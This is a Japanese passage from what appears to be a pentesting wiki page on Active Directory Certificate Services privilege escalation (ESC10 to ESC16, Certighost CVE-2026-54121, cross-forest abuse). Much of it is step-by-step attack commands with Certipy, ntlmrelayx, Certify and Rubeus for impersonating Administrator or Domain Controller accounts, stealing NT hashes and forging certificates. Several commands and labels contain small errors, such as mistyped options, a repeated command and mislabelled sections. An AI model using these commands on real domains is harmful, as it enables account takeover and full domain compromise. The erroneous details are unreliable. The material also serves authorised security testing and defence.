- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 配下の `StrongCertificateBindingEnforcement` のデフォルト設定は `1` です。以前は `0` でした。<sup>[[7]](#references)</sup>

**Case 1**

`StrongCertificateBindingEnforcement` が `0` に設定されている場合。

**Case 2**

`CertificateMappingMethods` に `UPN` bit（`0x4`）が含まれている場合。

### Abuse Case 1

`StrongCertificateBindingEnforcement` が `0` に設定されている場合、アカウントAが `GenericWrite` 権限を持っていると、任意のアカウントBを侵害するために悪用できます。

たとえば、`Jane@corp.local` に対する `GenericWrite` 権限を持っている場合、攻撃者は `Administrator@corp.local` の侵害を試みます。手順はESC9と同様で、任意の certificate template を利用できます。

まず、`GenericWrite` を悪用して Shadow Credentials で `Jane` の hash を取得します。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
その後、`Jane`の`userPrincipalName`は、制約違反を回避するために`@corp.local`の部分を意図的に省略して`Administrator`へ変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
続いて、デフォルトの `User` template を使用し、`Jane` として client authentication を可能にする certificate を要求します。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` はその後、元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
取得した証明書で認証すると `Administrator@corp.local` の NT hash が得られます。証明書にドメイン情報が含まれていないため、コマンドでドメインを指定する必要があります。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 悪用ケース 2

`CertificateMappingMethods` に `UPN` ビットフラグ（`0x4`）が含まれている場合、`GenericWrite` 権限を持つアカウント A は、`userPrincipalName` プロパティを持たない任意のアカウント B を侵害できます。これには、マシンアカウントや組み込みドメイン管理者である `Administrator` も含まれます。

ここでは、`GenericWrite` を活用して `Shadow Credentials` により `Jane` の hash を取得し、`DC$@corp.local` を侵害することを目標とします。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` の `userPrincipalName` はその後 `DC$@corp.local` に設定されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
デフォルトの`User`テンプレートを使用し、`Jane`としてclient authentication用のcertificateが要求されます。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` の `userPrincipalName` は、このプロセス後に元の値へ戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel 経由で認証するには、Certipy の `-ldap-shell` オプションを使用し、`u:CORP\DC$` として認証に成功したことが示されます。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shellを介して、`set_rbcd` などのコマンドで Resource-Based Constrained Delegation (RBCD) 攻撃を実行でき、ドメインコントローラーを侵害できる可能性があります。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
この脆弱性は、`userPrincipalName` が存在しないユーザーアカウント、または `userPrincipalName` が `sAMAccountName` と一致しないユーザーアカウントにも及びます。デフォルトの `Administrator@corp.local` は、昇格された LDAP 権限を持ち、デフォルトでは `userPrincipalName` が存在しないため、主要な標的となります。

## Relaying NTLM to ICPR - ESC11

### Explanation

CA Server が `IF_ENFORCEENCRYPTICERTREQUEST` を設定していない場合、RPC service 経由で署名なしの NTLM relay attacks を実行できます。[Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy` を使用して `Enforce Encryption for Requests` が Disabled かどうかを列挙できます。Disabled の場合、certipy は `ESC11` Vulnerabilities を表示します。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 悪用シナリオ

リレーサーバーをセットアップする必要があります:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
注: domain controllers の場合、DomainController で `-template` を指定する必要があります。

または、[sploutchy's fork of impacket](https://github.com/sploutchy/impacket) を使用します:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM を使用する ADCS CA への Shell access - ESC12

### Explanation

Administrators は、"Yubico YubiHSM2" のような外部デバイスに Certificate Authority を保存するよう設定できます。

CA server に USB device が USB port 経由で接続されている場合、または CA server が virtual machine の場合に USB device server を使用している場合、YubiHSM 内の keys を Key Storage Provider が生成・利用するために authentication key（"password" と呼ばれることもあります）が必要です。

この key/password は、レジストリの `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` に cleartext で保存されています。

Reference は [こちら](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) です。<sup>[[11]](#references)</sup>

### Abuse Scenario

Shell access を取得した際に CA の private key が物理 USB device に保存されている場合、その key を復元できます。

まず、CA certificate（これは public です）を取得し、次の操作を行います：
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
最後に、certutil の `-sign` コマンドを使用して、CA 証明書とその秘密鍵を使い、任意の新しい証明書を偽造します。

## OID Group Link Abuse - ESC13

### 説明

`msPKI-Certificate-Policy` 属性を使用すると、発行ポリシーを証明書テンプレートに追加できます。発行ポリシーを担当する `msPKI-Enterprise-Oid` オブジェクトは、PKI OID コンテナーの Configuration Naming Context（CN=OID,CN=Public Key Services,CN=Services）で確認できます。このオブジェクトの `msDS-OIDToGroupLink` 属性を使用すると、ポリシーを AD グループにリンクできます。これにより、証明書を提示したユーザーを、あたかもそのグループのメンバーであるかのようにシステムで認証できます。[Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

つまり、ユーザーが証明書の enroll 権限を持ち、その証明書が OID グループにリンクされている場合、ユーザーはこのグループの権限を継承できます。

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) を使用して OIDToGroupLink を見つけます：
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

ユーザーが持つ権限を確認するには、`certipy find` または `Certify.exe find /showAllPermissions` を使用できます。

`John` が `VulnerableTemplate` に enroll する権限を持っている場合、ユーザーは `VulnerableGroup` グループの権限を継承できます。

必要なのはテンプレートを指定することだけで、OIDToGroupLink 権限を持つ certificate を取得できます。
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 脆弱な Certificate Renewal Configuration - ESC14

### 説明

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping の説明は非常に詳細です。以下は原文からの引用です。<sup>[[14]](#references)</sup>

ESC14 は、主に Active Directory のユーザーまたはコンピューターアカウントにおける `altSecurityIdentities` 属性の誤用または安全でない設定によって発生する「weak explicit certificate mapping」の脆弱性に対処します。この複数値属性により、管理者は認証目的で X.509 certificates を AD アカウントに手動で関連付けることができます。この属性に値が設定されると、これらの明示的な mappings はデフォルトの certificate mapping ロジックを上書きできます。デフォルトのロジックは通常、certificate の SAN に含まれる UPN または DNS names、あるいは `szOID_NTDS_CA_SECURITY_EXT` security extension に埋め込まれた SID に依存します。

`altSecurityIdentities` 属性内で certificate を識別するために使用される文字列が広範すぎる、容易に推測できる、一意でない certificate fields に依存している、または簡単に spoof 可能な certificate components を使用している場合、「weak」mapping が発生します。攻撃者が、特権アカウントに対してこのように weak に定義された explicit mapping と一致する certificate を取得または作成できる場合、その certificate を使用して、そのアカウントとして認証し、なりすますことができます。

潜在的に weak な `altSecurityIdentities` mapping strings の例は次のとおりです。

- 一般的な Subject Common Name (CN) のみで mapping する場合: 例: `X509:<S>CN=SomeUser`。攻撃者は、より安全性の低い source からこの CN を持つ certificate を取得できる可能性があります。
- 特定の serial number や subject key identifier などによる追加の qualification なしに、過度に generic な Issuer Distinguished Names (DNs) または Subject DNs を使用する場合: 例: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`。
- 攻撃者が正当に取得または forge できる certificate で満たせる可能性のある、その他の予測可能な patterns または non-cryptographic identifiers を使用する場合（CA を compromise した場合や、ESC1 のような vulnerable template を発見した場合）。

`altSecurityIdentities` 属性は、mapping 用にさまざまな formats をサポートします。

- `X509:<I>IssuerDN<S>SubjectDN`（完全な Issuer および Subject DN による mapping）
- `X509:<SKI>SubjectKeyIdentifier`（certificate の Subject Key Identifier extension value による mapping）
- `X509:<SR>SerialNumberBackedByIssuerDN`（serial number による mapping。Issuer DN によって暗黙的に qualification される） - これは standard format ではなく、通常は `<I>IssuerDN<SR>SerialNumber` です。
- `X509:<RFC822>EmailAddress`（SAN の RFC822 name、通常は email address による mapping）
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey`（certificate の raw public key の SHA1 hash による mapping - 一般的に strong）

これらの mappings の security は、mapping string で使用される certificate identifiers の specificity、uniqueness、および cryptographic strength に大きく依存します。Domain Controllers で strong certificate binding modes が有効になっている場合でも（これらは主に SAN UPNs/DNS および SID extension に基づく implicit mappings に影響します）、設定が不適切な `altSecurityIdentities` entry は、mapping ロジック自体に欠陥があるか、許容範囲が広すぎる場合、なりすましへの直接的な経路となる可能性があります。
### Abuse Scenario

ESC14 は、Active Directory (AD) における **explicit certificate mappings**、具体的には `altSecurityIdentities` 属性を対象とします。この属性が設定されている場合（意図的な設定または誤設定）、攻撃者は mapping と一致する certificates を提示することでアカウントになりすますことができます。

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: 攻撃者が対象アカウントの `altSecurityIdentities` 属性への write permissions、または対象 AD object に対して以下のいずれかの permissions を付与する権限を持っていること:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: 対象に weak な X509RFC822 mapping が altSecurityIdentities に設定されていること。攻撃者は victim の mail attribute を対象の X509RFC822 name と一致するように設定し、victim として certificate を enroll し、その certificate を使用して対象として認証できます。
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: 対象に weak な X509IssuerSubject explicit mapping が `altSecurityIdentities` に設定されていること。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、対象の X509IssuerSubject mapping の subject と一致するように設定できます。その後、攻撃者は victim として certificate を enroll し、その certificate を使用して対象として認証できます。
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: 対象に weak な X509SubjectOnly explicit mapping が `altSecurityIdentities` に設定されていること。攻撃者は victim principal の `cn` または `dNSHostName` attribute を、対象の X509SubjectOnly mapping の subject と一致するように設定できます。その後、攻撃者は victim として certificate を enroll し、その certificate を使用して対象として認証できます。
### 具体的な操作
#### Scenario A

certificate template `Machine` の certificate を requestする
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
証明書を保存して変換する
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
証明書を使用して認証する
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
クリーンアップ（任意）
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
より具体的な attack methods については、さまざまな attack scenarios に応じて、以下を参照してください: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 解説

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc の説明は非常に詳細です。以下は原文からの引用です。<sup>[[15]](#references)</sup>

組み込みのデフォルトの version 1 certificate templates を使用すると、攻撃者は CSR を作成し、template で指定された設定済みの Extended Key Usage attributes よりも優先される application policies を含めることができます。必要なのは enrollment rights だけであり、**_WebServer_** template を使用して、client authentication、certificate request agent、codesigning certificates を生成できます。

### Abuse

以下は [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),詳細な使用方法を確認してください。<sup>[[14]](#references)</sup>


Certipy の `find` command は、CA に patch が適用されていない場合に、ESC15 の影響を受ける可能性がある V1 templates の特定に役立ちます。
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel による直接 Impersonation

**Step 1: 「Client Authentication」Application Policy と対象の UPN を注入して certificate を要求する。** Attacker `attacker@corp.local` は、enrollee-supplied subject を許可する「WebServer」V1 template を使用して `administrator@corp.local` をターゲットにする。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: 「Enrollee supplies subject」を含む脆弱な V1 template。
- `-application-policies 'Client Authentication'`: CSR の Application Policies extension に OID `1.3.6.1.5.5.7.3.2` を挿入します。
- `-upn 'administrator@corp.local'`: なりすまし用に SAN の UPN を設定します。

**Step 2: 取得した証明書を使用して、Schannel（LDAPS）経由で Authenticate します。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: 「Enrollee supplies subject」を設定したV1 templateから、"Certificate Request Agent" Application Policyを注入してcertificateを要求する。** このcertificateは、attacker（`attacker@corp.local`）がenrollment agentになるためのものです。ここではattacker自身のidentityに対するUPNは指定しません。目的はagent capabilityを得ることだからです。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` を注入します。

**Step 2: 「agent」証明書を使用して、標的の特権ユーザーに代わって証明書を要求します。** これは ESC3-like な手順で、Step 1 の証明書を agent 証明書として使用します。
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Step 3: "on-behalf-of" 証明書を使用して、特権ユーザーとして Authenticate する。**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA 上で Security Extension が無効化されている（グローバル）-ESC16

### 説明

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Extension の欠落による Elevation of Privilege)** とは、AD CS の設定で、すべての証明書に **szOID_NTDS_CA_SECURITY_EXT** extension が含まれることを強制していない場合に、攻撃者が次のように悪用できるシナリオを指します。

1. **SID binding なし**で証明書を要求する。

2. この証明書を使用して**任意のアカウントとして authentication**を行う。たとえば、高い権限を持つアカウント（Domain Administrator など）になりすます。

詳細な原理については、次の記事も参照してください:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

以下では、[このリンク](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)を参照しています。詳細な使用方法を確認するには、Clickしてください。<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) 環境が **ESC16** に対して脆弱かどうかを確認するには、
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Step 1: 被害者アカウントの初期 UPN を読み取る（任意 - 復元用）。
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Step 2: 被害者アカウントのUPNを、対象管理者の`sAMAccountName`に更新します。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**ステップ 3:（必要な場合）「victim」account の credentials を取得する（例: Shadow Credentials 経由）。**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Step 4: ESC16-vulnerable CA 上の _any suitable client authentication template_（例: "User"）から、「victim」ユーザーとして certificate を要求します。** CA は ESC16 に対して vulnerable であるため、この extension に関する template 固有の設定に関係なく、発行する certificate から SID security extension を自動的に省略します。Kerberos credential cache environment variable を設定します（shell command）：
```bash
export KRB5CCNAME=victim.ccache
```
次に証明書を要求します:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Step 5: 「victim」アカウントの UPN を元に戻す。**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Step 6: 対象の管理者としてAuthenticateする。**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 説明

**Certighost** は、CA が発行される証明書に設定すべき identity を解決する際に、requester が指定した request attributes を信頼する **AD CS enrollment chase / callback path** を悪用します。公開されている PoC では、細工された request に以下が含まれます:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA が接続する attacker-controlled host/IP
- **`rmd`**: impersonate する **target Domain Controller DNS name**

CA がこの chase に従うと、attacker に対して **SMB/LSA (`445`)** および **LDAP (`389`)** で接続します。attacker は、callback session が有効な domain principal として認証されるように、**real machine account**（通常はデフォルトの **`ms-DS-MachineAccountQuota`** により作成）を使用します。しかし rogue services は、代わりに **target DC** の identity attributes を返します:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA が **返された identity を認証済み callback principal に暗号学的に紐付けない**場合、session は attacker-controlled machine account として認証されているにもかかわらず、**Domain Controller** 用の certificate を発行できます。この点で、この bug は概念的に **Certifried** とは異なります。Certifried が `dNSHostName` などの AD attributes を書き換えるのに対し、attacker は **CA callback resolution 中に identity data を置き換えます**。<sup>[[2]](#references)</sup>

**有用な前提条件:**

- 低権限の **domain credentials**
- computer account を **create or reuse** する能力
- **CA** から attacker-controlled **ports `389` および `445`** への network reachability
- Vulnerable / unpatched CA request path（**July 14, 2026** の Microsoft update では、`cdc` に対する **DC validation** と **resolved-SID comparison** が追加されました）

生成された **`.pfx`** は **PKINIT** に使用でき、**`.ccache`** を生成できます。また、公開されている PoC flow では **target DC NT hash** も取得できます。これは通常、**full domain compromise** に十分です。

### Abuse

公開されている PoC は、完全な chain を自動化します:<sup>[[1]](#references)</sup>

1. attacker-controlled **machine account** を作成または再利用する。
2. `389` および `445` で **rogue LDAP and SMB/LSA listeners** を起動する。
3. attacker-controlled **`cdc`** および target **`rmd`** attributes を含む certificate request を submit する。
4. CA が controlled machine account として rogue listeners に authenticate するのを待ち、identity lookups には **target DC** の attributes を返す。
5. CA-signed **DC certificate** を受け取り、それを **PKINIT** に使用する。
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC で使用できる便利な runtime flags:

- `--listener <ip>`: `cdc` で通知される callback IP を明示的に選択する
- `--computer-name <NAME$>`: 新しいアカウントを作成する代わりに、既存の machine account を再利用する

**Operational notes:**

- PoC では、**privileged ports** `389` と `445` に bind するため、**root** が必要となる。
- Exploitation に成功すると、**DC `.pfx`** と **Kerberos `.ccache`** がローカルに書き込まれる。
- 証明書は **Domain Controller account** にマッピングされるため、後続のアクションには **certificate-based Kerberos auth**、**DCSync**、および復元された **machine NT hash** の再利用などが含まれる。<sup>[[2]](#references)</sup>

## Certificates による Forest の Compromising の説明（受動態）

### Compromised CA による Forest Trust の Breaking

**cross-forest enrollment** の設定は、比較的容易に行えるようにされている。resource forest の **root CA certificate** は管理者によって **account forests** に **published** され、resource forest の **enterprise CA** certificates は各 account forest の **`NTAuthCertificates` および AIA containers** に **added** される。この構成により、resource forest の **CA** には、PKI を管理する他のすべての forests に対する完全な control が与えられる。もしこの CA が **attackers によって compromised** されると、resource forest と account forests のすべての users の certificates が **them によって forged** され、forest の security boundary が破られる可能性がある。<sup>[[6]](#references)</sup>

### Foreign Principals に付与される Enrollment Privileges

multi-forest environments では、**certificate templates** を **publish** し、**Authenticated Users または foreign principals**（Enterprise CA が属する forest の外部にいる users/groups）に **enrollment および edit rights** を許可する Enterprise CAs について、注意が必要となる。\
trust をまたいだ authentication の際、**Authenticated Users SID** は AD によって user の token に追加される。そのため、ある domain が **Authenticated Users enrollment rights** を許可する template を持つ Enterprise CA を備えている場合、別の forest の user によって template が **enrolled** される可能性がある。同様に、template によって **enrollment rights** が foreign principal に明示的に付与されている場合、**cross-forest access-control relationship** が作成され、ある forest の principal が別の forest の template に **enroll** できるようになる。

どちらのシナリオでも、ある forest から別の forest への **attack surface** が増加する。certificate template の設定が attacker によって悪用され、foreign domain で追加の privileges が取得される可能性がある。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
